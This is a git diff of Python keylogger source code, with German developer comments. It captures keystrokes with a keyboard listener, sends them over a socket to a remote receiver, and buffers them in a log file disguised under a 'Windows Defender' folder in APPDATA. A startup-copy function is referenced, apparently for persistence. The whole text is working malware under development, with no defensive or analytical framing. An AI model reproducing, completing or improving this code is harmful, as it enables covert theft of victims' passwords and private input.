@@ -6,6 +6,7 @@ Header = 10
 
 
 class Global:
+    log_file_path = getenv('APPDATA') + "\\Windows Defender\\recvlog.txt"
     key_array = []
     i = 0
     local_log = False
@@ -37,6 +38,7 @@ class Socket:
             Socket.cmd_received = False
 
     def send_char(self, char):
+        print(char)
         char = dumps(char)
         char = bytes(f"{len(char):{Header}}", "utf-8") + char
         if Socket.connection:
@@ -55,7 +57,6 @@ class Socket:
             try:
                 self.active_socket.send(array)
                 Socket.connection = True
-                Global.key_array = []
             except(ConnectionResetError, ConnectionAbortedError, OSError):
                 Socket.connection = False
 
@@ -91,12 +92,25 @@ def copy_to_startup(file_name):
 
 
 def save_log(array_to_save):
-    path = getenv('APPDATA') + "\\Windows Defender"
-    makedirs(path, exist_ok=True)
-    with open(path + "\\recvlog.txt", "a+")as f:
+    with open(Global.log_file_path, "a+")as f:
         for char in array_to_save:
             f.write(char)
-    Global.key_array = []
+    Global.local_log = True
+
+
+def get_log():
+    temp_array = []
+    with open(Global.log_file_path, "r")as f:
+        log = f.read()
+    for char in log:
+        temp_array.append(char)
+    return temp_array
+
+
+def empty_log():
+    with open(Global.log_file_path, "w+")as f:
+        f.write("")
+    Global.local_log = False
 
 
 connection_established = Socket()
@@ -107,19 +121,23 @@ while True:
 
 #    if not Socket.cmd_received:
 #        connection_established.receive_command()
-    if Socket.connection and not Global.key_array:
+    if Socket.connection and not Global.local_log:
         with Listener(on_press=no_safe_key_press)as f:
             f.join()
 
-    elif Socket.connection and Global.key_array:
-        connection_established.send_array(Global.key_array)
+    elif Socket.connection and Global.local_log:
+        connection_established.send_array(get_log())
+        if Socket.connection:
+            empty_log()
 
     elif not Socket.connection:
         with Listener(on_press=safe_key_press)as f:
             f.join()
         Global.key_array.append("Lost")
         save_log(Global.key_array)
-
+        Global.key_array = []
 
 # Log Datei mit Übergabe richtig machen
-
+# Log Datei akutaliesiren bzw löschen nachdem gesendet wurde
+# Am Anfang gucken ob Log Datei leer oder voll ist
+# Sendet chars obwohl connection nicht da ist
